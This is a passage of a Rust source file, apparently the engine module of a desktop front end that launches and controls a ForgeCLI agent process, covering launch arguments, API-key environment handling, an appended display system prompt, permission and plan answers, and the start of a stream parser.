//! The engine: each chat is one ForgeCLI process (`forge`), driven over its
//! IDE host protocol (`forge -p --input-format stream-json --output-format
//! stream-json`, ForgeCLI's docs/CLI.md). Your messages go to its stdin as
//! `user` lines; its stdout is NDJSON that `Parser` turns into `Event`s for
//! the transcript. Permission prompts arrive as `can_use_tool` control
//! requests and are answered with the card's verdict.
//!
//! The endpoint comes from the profile in use (`endpoints.rs`): its URL,
//! model and key go to the process as `FORGE_*` variables, never on its
//! command line and never into a file.
//!
//! Which `forge`: `FORGE_CLI`, else `forge` beside this app's executable,
//! else `forge` on PATH.

use std::io::{BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::{Arc, Mutex};

use serde_json::{json, Value};

use crate::endpoints::{Profile, Wire};
use crate::modes::ModeId;
use crate::state::{DiffKind, DiffLine, QOption, Question, Review, ToolCall, ToolKind, ToolStatus};

/// What the process said, in the order it said it.
#[derive(Debug, Clone, PartialEq)]
pub enum Event {
    /// Reply text, as it streams.
    Text(String),
    /// The model's thinking, as it streams.
    Thinking(String),
    /// A new text or thinking block starts: it doesn't run on from the last.
    Break,
    /// ForgeCLI changed the permission mode itself (a plan approved, plan mode
    /// entered, an answer that set a mode): `system/status`, `permissionMode`.
    ModeChanged(String),
    /// The chat's `/goal` changed: set, checked, paused, met, given up or
    /// cleared (`system/goal`).
    Goal(crate::state::Goal),
    /// Something ForgeCLI did that the chat says in a line (`system`
    /// events: a compaction, a model fallback, a subtask, the loop guard):
    /// its text, and whether it reads as a problem.
    Notice { text: String, error: bool },
    /// A sub-agent's own tool call; `parent` is the call that started it.
    SubTool {
        parent: String,
        id: String,
        name: String,
        input: Value,
    },
    /// A sub-agent's tool call finished.
    SubResult {
        parent: String,
        id: String,
        is_error: bool,
    },
    /// A sub-agent's words (its latest message, which ends as its answer).
    SubText { parent: String, text: String },
    /// A tool call, with its full input.
    ToolUse {
        id: String,
        name: String,
        input: Value,
    },
    /// An HTML page a Write call is writing, as far as it has streamed (the
    /// live design panel shows it forming): at most every few hundred
    /// milliseconds, and once more, whole, when the call is complete.
    Drafting {
        id: String,
        path: String,
        content: String,
    },
    /// A tool call's result.
    ToolResult {
        id: String,
        output: String,
        is_error: bool,
        images: Vec<crate::state::ToolImage>,
    },
    /// Forge asks before running a tool.
    Ask {
        request_id: String,
        tool_use_id: String,
        tool_name: String,
        input: Value,
        suggestions: Value,
    },
    /// Forge withdrew a question (the turn was interrupted).
    CancelAsk { request_id: String },
    /// An immediate command's answer (`/btw`): it ends no turn.
    Immediate { text: String, is_error: bool },
    /// A turn ended.
    TurnEnd {
        ms: u64,
        usage: Option<crate::context::Usage>,
        error: Option<String>,
    },
    /// The process couldn't start a run (bad key, unknown model...).
    Error(String),
    /// The process is gone; `detail` is the end of what it wrote on stderr.
    Exited { code: Option<i32>, detail: String },
    /// ForgeCLI took your message as a turn, under this id (`rewind_files` names turns by it).
    /// Also the words, so a queued message that ran as a turn of its own
    /// (its id is then ForgeCLI's) is still recognised.
    UserAccepted { uuid: String, text: String },
    /// The answer to a control request this app sent (`Session::request`).
    ControlReply {
        request_id: String,
        result: Result<Value, String>,
    },
}

// ---------------------------------------------------------------- launching

/// The `forge` executable to run. Never this app itself: Windows names are
/// case-insensitive, so a `Forge.exe` app would also answer to `forge.exe`
/// (and launching it as the engine opens a second window).
pub fn find_cli() -> Option<PathBuf> {
    let me = std::env::current_exe()
        .ok()
        .and_then(|e| e.canonicalize().ok());
    let not_me = |p: &PathBuf| p.is_file() && p.canonicalize().ok() != me;
    if let Some(p) = std::env::var_os("FORGE_CLI")
        .map(PathBuf::from)
        .filter(not_me)
    {
        return Some(p);
    }
    let name = if cfg!(windows) { "forge.exe" } else { "forge" };
    if let Some(dir) = std::env::current_exe()
        .ok()
        .and_then(|e| e.parent().map(PathBuf::from))
    {
        for beside in [dir.join(name), dir.join("bin").join(name)] {
            if not_me(&beside) {
                return Some(beside);
            }
        }
    }
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path)
        .map(|d| d.join(name))
        .find(not_me)
}

/// How a chat's process starts: its arguments and the endpoint variables.
#[derive(Debug, Clone, PartialEq)]
pub struct Launch {
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
}

/// A chat's launch as ForgeCLI's own terminal UI runs it: the same model,
/// mode, endpoint, settings and session, less what only a host speaks (print
/// mode, the stream formats, the permission channel, echoed messages).
pub fn interactive(launch: &Launch) -> Launch {
    // Flags dropped, and whether each takes the next argument with it.
    const HOST: &[(&str, bool)] = &[
        ("-p", false),
        ("--input-format", true),
        ("--output-format", true),
        ("--include-partial-messages", false),
        ("--replay-user-messages", false),
        ("--include-hook-events", false),
        ("--permission-prompt-tool", true),
        ("--no-input", false),
        ("--json-schema", true),
        ("--no-session-persistence", false),
    ];
    let mut args = vec![];
    let mut it = launch.args.iter();
    while let Some(a) = it.next() {
        let flag = a.split('=').next().unwrap_or(a);
        match HOST.iter().find(|(f, _)| *f == flag) {
            Some((_, takes)) => {
                if *takes && !a.contains('=') {
                    it.next();
                }
            }
            None => args.push(a.clone()),
        }
    }
    Launch {
        args,
        env: launch.env.clone(),
    }
}

/// The base URL ForgeCLI wants: it adds `/v1/messages` (Messages API),
/// `/chat/completions` (OpenAI-compatible) or `/models/<model>:...` (Gemini)
/// itself.
fn cli_base_url(profile: &Profile) -> String {
    if profile.wire == Wire::Gemini {
        return profile.base_url.trim().trim_end_matches('/').to_string();
    }
    let url = profile.chat_url();
    let suffix = match profile.wire {
        Wire::Anthropic => "/v1/messages",
        _ => "/chat/completions",
    };
    url.strip_suffix(suffix).unwrap_or(&url).to_string()
}

/// What the desktop adds to ForgeCLI's system prompt: how replies are shown
/// here. Every diagram is drawn with the Diagram Design skill (`plugin.rs`)
/// unless the user names another format (Mermaid, ASCII, SVG, ...), which
/// then wins; Mermaid and SVG blocks still render inline (`mermaid.rs`).
/// Visual design work goes through the design skill. An HTML page Forge
/// writes is rendered, critiqued and revised before the reply ends (up to
/// three rounds).
pub const SURFACE_PROMPT: &str = "You are running inside Forge Desktop, which renders your replies as Markdown and draws diagrams in the chat. \
Diagram Design is the default for every diagram. When the user asks for a diagram, chart or graph, or one would explain structure \
or flow better than prose (architecture, a request's path, data flow, states, a sequence of calls, a data model, a timeline, a \
comparison), use the diagram-design skill unless the user names another format: it writes a self-contained HTML file around one \
SVG in Forge's own style, and Forge shows that file as a diagram in the chat. Save it in the project (e.g. under docs/diagrams/) \
and name it in your reply. When the user asks for a specific format (Mermaid, ASCII art, SVG, PlantUML, Graphviz, a table...), \
use exactly that format without hesitating. When the diagram-design skill is not available, fall back to a ```mermaid fenced \
block or an ```svg block with one <svg>; both render inline here (Mermaid: flowchart, sequenceDiagram, stateDiagram-v2, \
classDiagram, erDiagram, mindmap, pie, gantt, timeline, journey, xychart-beta, quadrantChart, gitGraph). Put ASCII art in a ```text block so it keeps its alignment. \
For a deck, a page, a prototype, a poster or any other visual design, use the design skill. \
When you write or change an HTML page (a report, a page, a mockup; diagrams included), review it before you call it done. \
Look at it rendered: when Forge's browser tools are available (navigate, screenshot), navigate to the file (a file:// URL), \
take a screenshot, and look at the picture; otherwise read the file back as a reviewer would. Critique it in two passes. Design: hierarchy \
(one clear title, headings that step down), spacing and alignment, contrast and legibility, nothing overflowing or overlapping, \
consistent colours and type, and a layout that also holds in a narrow window. Content: accurate, complete, no placeholder or lorem text, no \
dead links, every section earns its place. Fix what you find and look again; stop when a pass finds nothing worth fixing, or \
after three rounds. Then tell the user, in a line or two, what the review changed.";

/// Which ForgeCLI conversation a process runs: a new one under the id the
/// desktop chose, or one already on disk, resumed.
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Conversation<'a> {
    New(&'a str),
    Resume(&'a str),
    /// A copy: `from`'s conversation, carried on under `id`.
    Fork { from: &'a str, id: &'a str },
}

pub fn launch(
    profile: &Profile,
    mode: ModeId,
    bypass_allowed: bool,
    conversation: Conversation,
) -> Result<Launch, String> {
    let token = crate::health::token(&profile.auth)?;
    let mut args: Vec<String> = [
        "-p",
        "--input-format",
        "stream-json",
        "--output-format",
        "stream-json",
        "--include-partial-messages",
        "--permission-prompt-tool",
        "stdio",
        "--model",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    args.push(profile.model.clone());
    args.extend(crate::modes::cli_args(mode, bypass_allowed));
    args.extend([
        "--append-system-prompt".to_string(),
        SURFACE_PROMPT.to_string(),
    ]);
    // Forge's plugin: Diagram Design and the office-documents skill.
    if let Some(dir) = crate::plugin::dir() {
        args.extend([
            "--plugin-dir".to_string(),
            dir.to_string_lossy().into_owned(),
        ]);
    }
    // Each accepted message comes back with its turn id: Revert needs it.
    args.push("--replay-user-messages".to_string());
    match conversation {
        Conversation::New(id) => args.extend(["--session-id".to_string(), id.to_string()]),
        Conversation::Resume(id) => args.extend(["--resume".to_string(), id.to_string()]),
        Conversation::Fork { from, id } => args.extend([
            "--resume".to_string(),
            from.to_string(),
            "--fork-session".to_string(),
            "--session-id".to_string(),
            id.to_string(),
        ]),
    }
    let mut env = vec![];
    let base = cli_base_url(profile);
    match profile.wire {
        Wire::Anthropic => {
            env.push(("FORGE_BASE_URL".into(), base));
            if let Some(t) = token {
                // As the model check sends it: both headers.
                env.push(("FORGE_API_KEY".into(), t.clone()));
                env.push(("FORGE_AUTH_TOKEN".into(), t));
            }
        }
        Wire::Openai => {
            env.push(("FORGE_OPENAI_BASE_URL".into(), base));
            if let Some(t) = token {
                env.push(("FORGE_OPENAI_API_KEY".into(), t));
            }
        }
        Wire::Gemini => {
            env.push(("FORGE_GEMINI_BASE_URL".into(), base));
            if let Some(t) = token {
                env.push(("FORGE_GEMINI_API_KEY".into(), t));
            }
        }
    }
    if !profile.headers.is_empty() {
        let lines: Vec<String> = profile
            .headers
            .iter()
            .map(|(k, v)| format!("{k}: {v}"))
            .collect();
        env.push(("FORGE_CUSTOM_HEADERS".into(), lines.join("\n")));
    }
    if let Some(w) = profile.capabilities.context_window.filter(|w| *w > 0) {
        env.push(("FORGE_CONTEXT_WINDOW".into(), w.to_string()));
    }
    Ok(Launch { args, env })
}

// ---------------------------------------------------------------- the process

/// Hook runs, read from ForgeCLI's stderr (`forge.includeHookEvents`, which
/// adds `--verbose --debug=hooks`): ForgeCLI logs each run (`forge_hooks:
/// running hooks event=… matcher=…`), then says what its hooks said (a
/// message, an error, a block) as plain lines, before its next log line.
/// Its stream has no hook events of its own yet.
#[derive(Default)]
struct HookLog {
    /// The run being read: its event, what it matched, and what it said.
    run: Option<(String, Option<String>, Vec<String>)>,
}

impl HookLog {
    /// One stderr line; a run's notice once the next log line shows it ended.
    fn line(&mut self, line: &str) -> Option<Event> {
        let line = line.trim_end();
        if !is_log_line(line) {
            if let Some((_, _, said)) = &mut self.run {
                if !line.trim().is_empty() {
                    said.push(line.trim().to_string());
                }
            }
            return None;
        }
        let done = self.flush();
        if let Some(rest) = line.split_once("forge_hooks: running hooks").map(|(_, r)| r) {
            let field = |k: &str| {
                rest.split_once(&format!("{k}="))
                    .map(|(_, v)| v.split_whitespace().next().unwrap_or_default().to_string())
            };
            let event = field("event").unwrap_or_default().trim_matches('"').to_string();
            let matcher = field("matcher")
                .and_then(|m| m.strip_prefix("Some(").map(str::to_string))
                .map(|m| m.trim_end_matches(')').trim_matches('"').to_string());
            self.run = Some((event, matcher, vec![]));
        }
        done
    }

    /// The run being read, as a notice.
    fn flush(&mut self) -> Option<Event> {
        let (event, matcher, said) = self.run.take()?;
        let what = match matcher.filter(|m| !m.is_empty()) {
            Some(m) => format!("{event} hook on {m}"),
            None => format!("{event} hook"),
        };
        let text = if said.is_empty() {
            format!("{what} ran.")
        } else {
            format!("{what}: {}", one_line(&said.join(" · "), 240))
        };
        Some(Event::Notice { text, error: false })
    }
}

/// A line of ForgeCLI's debug log (`2026-10-29T12:56:12.998519Z DEBUG …`).
fn is_log_line(line: &str) -> bool {
    let b = line.as_bytes();
    b.len() > 20 && b[..4].iter().all(u8::is_ascii_digit) && b[4] == b'-' && b[10] == b'T'
}

/// One chat's running `forge`. Dropping it ends the process.
pub struct Session {
    stdin: Arc<Mutex<Option<ChildStdin>>>,
    child: Arc<Mutex<Child>>,
    pub events: async_channel::Receiver<Event>,
}

impl Session {
    pub fn spawn(exe: &Path, launch: &Launch, cwd: &Path) -> Result<Session, String> {
        let mut cmd = Command::new(exe);
        cmd.args(&launch.args).current_dir(cwd);
        let hooks = launch.args.iter().any(|a| a == "--include-hook-events");
        Self::start(cmd, launch, &[], &exe.display().to_string(), hooks)
    }

    /// ForgeCLI in a remote project (`remote.rs`): started through WSL, SSH
    /// or docker, its environment written to stdin first, never on a
    /// command line.
    pub fn spawn_remote(
        remote: &crate::remote::Remote,
        forge: &str,
        launch: &Launch,
        extra: &crate::remote::Extra,
    ) -> Result<Session, String> {
        let (cmd, prelude) = crate::remote::launch(remote, forge, &launch.args, &launch.env, extra);
        let none = Launch {
            args: vec![],
            env: vec![],
        };
        let hooks = launch.args.iter().any(|a| a == "--include-hook-events");
        Self::start(cmd, &none, &prelude, &remote.target.label(), hooks)
    }

    /// `hooks`: read hook runs from stderr (see [`HookLog`]).
    fn start(
        mut cmd: Command,
        launch: &Launch,
        prelude: &[u8],
        what: &str,
        hooks: bool,
    ) -> Result<Session, String> {
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // Keys and endpoints this app may have inherited must not mix with the profile's.
        for k in [
            "FORGE_BASE_URL",
            "FORGE_API_KEY",
            "FORGE_AUTH_TOKEN",
            "FORGE_OPENAI_BASE_URL",
            "FORGE_OPENAI_API_KEY",
            "FORGE_GEMINI_BASE_URL",
            "FORGE_GEMINI_API_KEY",
            "FORGE_GEMINI_AUTH_HEADER",
            "FORGE_CUSTOM_HEADERS",
            "FORGE_MODEL",
        ] {
            cmd.env_remove(k);
        }
        cmd.envs(launch.env.iter().map(|(k, v)| (k, v)));
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            const CREATE_NO_WINDOW: u32 = 0x0800_0000;
            cmd.creation_flags(CREATE_NO_WINDOW);
        }
        let mut child = cmd
            .spawn()
            .map_err(|e| format!("could not start {what}: {e}"))?;
        let mut stdin = child.stdin.take();
        if !prelude.is_empty() {
            if let Some(w) = stdin.as_mut() {
                w.write_all(prelude)
                    .and_then(|_| w.flush())
                    .map_err(|e| format!("could not reach {what}: {e}"))?;
            }
        }
        let stdout = child.stdout.take().ok_or("no stdout")?;
        let mut stderr = child.stderr.take().ok_or("no stderr")?;
        let child = Arc::new(Mutex::new(child));
        let (tx, rx) = async_channel::unbounded();

        // stderr: kept (its end) for when the process exits early.
        let tail = Arc::new(Mutex::new(String::new()));
        let err_tail = tail.clone();
        let hook_tx = tx.clone();
        let err_thread = std::thread::spawn(move || {
            let mut buf = [0u8; 4096];
            let mut log = HookLog::default();
            let mut partial = String::new();
            while let Ok(n) = stderr.read(&mut buf) {
                if n == 0 {
                    break;
                }
                let text = String::from_utf8_lossy(&buf[..n]);
                let mut kept = text.to_string();
                if hooks {
                    // Whole lines to the hook reader; its debug log stays
                    // out of what an early exit shows.
                    partial.push_str(&text);
                    kept.clear();
                    while let Some(i) = partial.find('\n') {
                        let line: String = partial.drain(..=i).collect();
                        if let Some(ev) = log.line(&line) {
                            let _ = hook_tx.send_blocking(ev);
                        }
                        if !is_log_line(&line) {
                            kept.push_str(&line);
                        }
                    }
                }
                let mut t = err_tail.lock().unwrap();
                t.push_str(&kept);
                if t.len() > 8192 {
                    let cut = t.len() - 4096;
                    let cut = (cut..t.len())
                        .find(|i| t.is_char_boundary(*i))
                        .unwrap_or(t.len());
                    t.drain(..cut);
                }
            }
            if let Some(ev) = log.flush() {
                let _ = hook_tx.send_blocking(ev);
            }
        });

        let waiter = child.clone();
        std::thread::spawn(move || {
            let mut parser = Parser::default();
            for line in BufReader::new(stdout).lines() {
                let Ok(line) = line else { break };
                for ev in parser.line(&line) {
                    if tx.send_blocking(ev).is_err() {
                        return;
                    }
                }
            }
            let _ = err_thread.join();
            let code = waiter.lock().unwrap().wait().ok().and_then(|s| s.code());
            let detail = last_lines(&tail.lock().unwrap(), 6);
            let _ = tx.send_blocking(Event::Exited { code, detail });
        });

        Ok(Session {
            stdin: Arc::new(Mutex::new(stdin)),
            child,
            events: rx,
        })
    }

    fn write(&self, v: Value) -> Result<(), String> {
        let mut guard = self.stdin.lock().unwrap();
        let w = guard.as_mut().ok_or("Forge's input is closed")?;
        writeln!(w, "{v}")
            .and_then(|_| w.flush())
            .map_err(|e| format!("could not reach Forge: {e}"))
    }

    pub fn send(&self, text: &str) -> Result<(), String> {
        self.write(user_line(text))
    }

    /// A message sent while a reply runs, for its next step (`priority:
    /// "next"`), with its attachments (`attach::content_blocks`): ForgeCLI
    /// gives it to the model between tool calls, or runs it next when the
    /// turn ends first; either way it is echoed back under `uuid` when it
    /// lands (`Event::UserAccepted`).
    pub fn queue_content(&self, content: Value, uuid: &str) -> Result<(), String> {
        self.write(json!({ "type": "user", "message": { "role": "user", "content": content }, "parent_tool_use_id": null, "session_id": "", "priority": "next", "uuid": uuid }))
    }

    /// Take back a queued message that hasn't reached the model; the answer
    /// (`{"cancelled": bool}`) arrives as `Event::ControlReply`.
    pub fn cancel_queued(&self, uuid: &str) -> Result<String, String> {
        self.control(json!({ "subtype": "cancel_queued", "uuid": uuid }))
    }

    /// The session's MCP servers and how each is doing (`mcp_status`); the
    /// answer arrives as `Event::ControlReply`.
    pub fn mcp_status(&self) -> Result<String, String> {
        self.control(json!({ "subtype": "mcp_status" }))
    }

    /// Restart one of the session's MCP servers from its config.
    pub fn mcp_reconnect(&self, server: &str) -> Result<String, String> {
        self.control(json!({ "subtype": "mcp_reconnect", "serverName": server }))
    }

    /// Turn one of the session's MCP servers off or back on (ForgeCLI keeps
    /// the choice, as `/mcp enable|disable` does).
    pub fn mcp_toggle(&self, server: &str, enabled: bool) -> Result<String, String> {
        self.control(json!({ "subtype": "mcp_toggle", "serverName": server, "enabled": enabled }))
    }

    /// Ask ForgeCLI what this session offers (`initialize`): its commands
    /// with their descriptions (built-ins, custom commands, skills, MCP
    /// prompts), output styles and models. The answer arrives as
    /// `Event::ControlReply`.
    pub fn initialize(&self) -> Result<String, String> {
        self.control(json!({ "subtype": "initialize" }))
    }

    /// Ask what fills the context (ForgeCLI's `/context` numbers); the answer
    /// arrives as `Event::ControlReply` (`context::ContextUsage::from_json`).
    pub fn context_usage(&self) -> Result<String, String> {
        self.control(json!({ "subtype": "get_context_usage" }))
    }

    /// Your message with its attachments (`attach::content_blocks`).
    pub fn send_content(&self, content: Value) -> Result<(), String> {
        self.write(json!({ "type": "user", "message": { "role": "user", "content": content }, "parent_tool_use_id": null, "session_id": "" }))
    }

    /// A control request whose answer matters: returns its id, and the
    /// answer arrives as `Event::ControlReply`.
    pub fn request(&self, request: Value) -> Result<String, String> {
        self.control(request)
    }

    pub fn answer(
        &self,
        request_id: &str,
        allow: bool,
        always: bool,
        input: &Value,
        suggestions: &Value,
        note: Option<&str>,
    ) -> Result<(), String> {
        self.write(answer_line(
            request_id,
            allow,
            always,
            input,
            suggestions,
            note,
        ))
    }

    /// Answer AskUserQuestion with what you chose (`questions_answer_line`).
    pub fn answer_questions(
        &self,
        request_id: &str,
        input: &Value,
        questions: &[Question],
    ) -> Result<(), String> {
        self.write(questions_answer_line(request_id, input, questions))
    }

    /// Skip AskUserQuestion: Forge goes on with its own assumptions.
    pub fn skip_questions(&self, request_id: &str) -> Result<(), String> {
        self.write(skip_questions_line(request_id))
    }

    /// Answer a plan (ExitPlanMode), as Forge for VS Code does.
    pub fn answer_plan(
        &self,
        request_id: &str,
        choice: PlanChoice,
        input: &Value,
    ) -> Result<(), String> {
        self.write(plan_answer_line(request_id, choice, input))
    }

    fn control(&self, request: Value) -> Result<String, String> {
        static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);
        let id = format!(
            "forge-gpui-{}",
            NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        );
        self.write(json!({ "type": "control_request", "request_id": id, "request": request }))
            .map(|_| id)
    }

    pub fn interrupt(&self) -> Result<(), String> {
        self.control(json!({ "subtype": "interrupt" })).map(drop)
    }

    /// Stop one sub-agent (its Task call's id); the turn goes on. Returns
    /// the request's id: the answer says whether it was still running.
    pub fn stop_agent(&self, id: &str) -> Result<String, String> {
        self.control(json!({ "subtype": "stop_task", "task_id": id }))
    }

    /// Stop every sub-agent; the turn goes on.
    pub fn stop_agents(&self) -> Result<String, String> {
        self.control(json!({ "subtype": "stop_task", "all": true }))
    }

    pub fn set_model(&self, model: &str) -> Result<(), String> {
        self.control(json!({ "subtype": "set_model", "model": model }))
            .map(drop)
    }

    pub fn set_mode(&self, mode: ModeId) -> Result<(), String> {
        self.control(
            json!({ "subtype": "set_permission_mode", "mode": mode.permission().cli_name() }),
        )
        .map(drop)
    }
}

impl Drop for Session {
    fn drop(&mut self) {
        // Closing stdin ends the session; kill makes sure.
        self.stdin.lock().unwrap().take();
        let _ = self.child.lock().unwrap().kill();
    }
}

fn last_lines(s: &str, n: usize) -> String {
    let lines: Vec<&str> = s.lines().filter(|l| !l.trim().is_empty()).collect();
    lines[lines.len().saturating_sub(n)..].join("\n")
}

pub fn user_line(text: &str) -> Value {
    json!({ "type": "user", "message": { "role": "user", "content": [{ "type": "text", "text": text }] }, "parent_tool_use_id": null, "session_id": "" })
}

pub fn answer_line(
    request_id: &str,
    allow: bool,
    always: bool,
    input: &Value,
    suggestions: &Value,
    note: Option<&str>,
) -> Value {
    let response = if allow {
        let mut r = json!({ "behavior": "allow", "updatedInput": input });
        if always && suggestions.as_array().is_some_and(|a| !a.is_empty()) {
            r["updatedPermissions"] = suggestions.clone();
        }
        r
    } else {
        let message = match note.map(str::trim).filter(|n| !n.is_empty()) {
            Some(n) => format!("The user declined this and said what to do instead: {n}"),
            None => "The user declined this. Ask what to do instead.".to_string(),
        };
        json!({ "behavior": "deny", "message": message })
    };
    json!({ "type": "control_response", "response": { "subtype": "success", "request_id": request_id, "response": response } })
}

/// The tool that puts questions to you.
pub const QUESTION_TOOL: &str = "AskUserQuestion";

/// Tools ForgeCLI always asks about, whatever the rules: a rule for them
/// would never be used, so their cards offer no "Always allow".
pub fn always_asks(tool: &str) -> bool {
    matches!(tool, QUESTION_TOOL | "EnterPlanMode" | "ExitPlanMode")
}

/// The questions an AskUserQuestion call asks (`questions[]`), none chosen yet.
pub fn questions(input: &Value) -> Vec<Question> {
    let s = |v: &Value, k: &str| v[k].as_str().unwrap_or_default().trim().to_string();
    input["questions"]
        .as_array()
        .into_iter()
        .flatten()
        .map(|q| Question {
            header: s(q, "header"),
            text: s(q, "question"),
            options: q["options"]
                .as_array()
                .into_iter()
                .flatten()
                .map(|o| QOption {
                    label: s(o, "label"),
                    description: s(o, "description"),
                })
                .collect(),
            multi: q["multiSelect"].as_bool().unwrap_or(false),
            ..Default::default()
        })
        .collect()
}

/// A question card's title: "Forge has a question", "Forge has 3 questions".
pub fn questions_title(n: usize) -> String {
    if n == 1 {
        "Forge has a question".into()
    } else {
        format!("Forge has {n} questions")
    }
}

/// Your answers to AskUserQuestion: the call's input with `answers`
/// (question → answer) added, which ForgeCLI hands the tool.
pub fn questions_answer_line(request_id: &str, input: &Value, questions: &[Question]) -> Value {
    let answers: serde_json::Map<String, Value> = questions
        .iter()
        .filter_map(|q| Some((q.text.clone(), Value::String(q.answer()?))))
        .collect();
    let mut updated = input.clone();
    updated["answers"] = Value::Object(answers);
    json!({ "type": "control_response", "response": { "subtype": "success", "request_id": request_id,
        "response": { "behavior": "allow", "updatedInput": updated } } })
}

/// What Forge hears when you skip its questions.
pub const QUESTIONS_SKIPPED: &str =
    "The user skipped these questions. Proceed with your best judgement and state your assumptions.";

pub fn skip_questions_line(request_id: &str) -> Value {
    json!({ "type": "control_response", "response": { "subtype": "success", "request_id": request_id,
        "response": { "behavior": "deny", "message": QUESTIONS_SKIPPED } } })
}

/// How a plan is answered: start on it with edits approved automatically or
/// one by one, or keep planning.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum PlanChoice {
    AutoAcceptEdits,
    ApproveEdits,
    KeepPlanning,
}

/// A plan's answer. Yes sets the session's mode in the same answer
/// (`updatedPermissions`, `setMode`), so ForgeCLI leaves plan mode for the
/// mode chosen and says so (`system/status`); No keeps planning.
pub fn plan_answer_line(request_id: &str, choice: PlanChoice, input: &Value) -> Value {
    let set_mode = |mode: &str| {
        json!({ "behavior": "allow", "updatedInput": input,
            "updatedPermissions": [{ "type": "setMode", "mode": mode, "destination": "session" }] })
    };
    let response = match choice {
        PlanChoice::AutoAcceptEdits => set_mode("acceptEdits"),
        PlanChoice::ApproveEdits => set_mode("default"),
        PlanChoice::KeepPlanning => json!({ "behavior": "deny",
            "message": "The user wants to keep planning. Don't start on the plan: ask what to change, and refine it with them." }),
    };
    json!({ "type": "control_response", "response": { "subtype": "success", "request_id": request_id, "response": response } })
}

/// The title of a plan's question card (`ask_text`), which the card shows
/// with the plan's own answers.
pub const PLAN_ASK_TITLE: &str = "Forge's plan is ready. Start on it?";

/// The title of the card asking to run JavaScript in the browser: the card
/// shows the whole script, as code, so nothing in it is hidden.
pub const JS_ASK_TITLE: &str = "Allow Forge to run JavaScript in the browser?";

/// What a browser tool acts on, whole: the URL, the text typed, the script.
fn browser_subject(input: &Value) -> Option<String> {
    [
        "url",
        "text",
        "expression",
        "key",
        "value",
        "selector",
        "url_contains",
        "id",
        "direction",
    ]
    .iter()
    .find_map(|k| input[*k].as_str().filter(|v| !v.is_empty()))
    .map(str::to_string)
}

// ---------------------------------------------------------------- the stream

/// Turns stdout lines into events. Text and thinking come from the streamed
/// deltas; the complete `assistant` message that follows them adds only its
/// tool calls (and its text, when nothing streamed, for a provider that
/// doesn't stream). A sub-agent's messages stay inside its tool call.
#[derive(Default)]
pub struct Parser {
    streamed: bool,
    /// Write calls streaming in, by content block: their id and input so
    /// far, and when their draft was last sent.
    writes: std::collections::HashMap<u64, (String, String, Option<std::time::Instant>)>,
    /// Inside a `<think>` / `<thought>` span a model wrote into its reply
    /// text (Gemma, Qwen, DeepSeek behind an OpenAI-compatible route).
    in_thought: bool,
    /// The end of the last delta, held back while it could be the start
    /// of a tag cut across two deltas ("<tho").
    held: String,
}

/// How often a page being written is shown again while it streams.
const DRAFT_EVERY: std::time::Duration = std::time::Duration::from_millis(250);

/// The tags a model wraps its reasoning in when it has no thinking block.
const THOUGHT_OPEN: [&str; 2] = ["<think>", "<thought>"];
const THOUGHT_CLOSE: [&str; 2] = ["</think>", "</thought>"];

impl Parser {
    /// Reply text, with any reasoning a model wrapped in tags split out as
    /// thinking, so it folds away instead of reading as the answer.
    fn text(&mut self, text: &str, out: &mut Vec<Event>) {
        let mut rest = std::mem::take(&mut self.held) + text;
        loop {
            let tags: &[&str] = if self.in_thought {
                &THOUGHT_CLOSE
            } else {
                &THOUGHT_OPEN
            };
            let found = tags
                .iter()
                .filter_map(|t| rest.find(t).map(|i| (i, t.len())))
                .min_by_key(|(i, _)| *i);
            match found {
                Some((i, len)) => {
                    self.emit(&rest[..i], out);
                    self.in_thought = !self.in_thought;
                    out.push(Event::Break);
                    rest = rest[i + len..].to_string();
                }
                None => {
                    // Hold back a tail that could begin a tag.
                    let keep = rest
                        .char_indices()
                        .rev()
                        .take(10)
                        .map(|(i, _)| i)
                        .filter(|&i| {
                            let tail = &rest[i..];
                            tail.starts_with('<') && tags.iter().any(|t| t.starts_with(tail))
                        })
                        .min();
                    match keep {
                        Some(i) => {
                            self.held = rest[i..].to_string();
                            self.emit(&rest[..i], out);
                        }
                        None => self.emit(&rest, out),
                    }
                    return;
                }
            }
        }
    }

    fn emit(&self, text: &str, out: &mut Vec<Event>) {
        if text.is_empty() {
            return;
        }
        out.push(if self.in_thought {
            Event::Thinking(text.into())
        } else {
            Event::Text(text.into())
        });
    }

    /// The turn ended: what was held back is said, and a span left open
    /// closes.
    fn end_turn(&mut self, out: &mut Vec<Event>) {
        let held = std::mem::take(&mut self.held);
        self.emit(&held, out);
        self.in_thought = false;
    }

    pub fn line(&mut self, line: &str) -> Vec<Event> {
        let Ok(v) = serde_json::from_str::<Value>(line) else {
            return vec![];
        };
        let nested = v.get("parent_tool_use_id").is_some_and(|p| !p.is_null());
        let mut out = vec![];
        // A sub-agent's messages: its steps, for the Agents panel.
        if nested {
            let parent = v["parent_tool_use_id"]
                .as_str()
                .unwrap_or_default()
                .to_string();
            let content = v["message"]["content"]
                .as_array()
                .cloned()
                .unwrap_or_default();
            match v["type"].as_str() {
                Some("assistant") => {
                    let text: Vec<&str> = content
                        .iter()
                        .filter(|b| b["type"] == "text")
                        .filter_map(|b| b["text"].as_str())
                        .collect();
                    if !text.is_empty() {
                        out.push(Event::SubText {
                            parent: parent.clone(),
                            text: text.join("\n"),
                        });
                    }
                    for b in content.iter().filter(|b| b["type"] == "tool_use") {
                        out.push(Event::SubTool {
                            parent: parent.clone(),
                            id: b["id"].as_str().unwrap_or_default().into(),
                            name: b["name"].as_str().unwrap_or_default().into(),
                            input: b["input"].clone(),
                        });
                    }
                }
                Some("user") => {
                    for b in content.iter().filter(|b| b["type"] == "tool_result") {
                        out.push(Event::SubResult {
                            parent: parent.clone(),
                            id: b["tool_use_id"].as_str().unwrap_or_default().into(),
                            is_error: b["is_error"].as_bool().unwrap_or(false),
                        });
                    }
                }
                _ => {}
            }
            return out;
        }
        match v["type"].as_str() {
            Some("stream_event") if !nested => {
                let ev = &v["event"];
                if ev["type"] == "content_block_start"
                    && matches!(
                        ev["content_block"]["type"].as_str(),
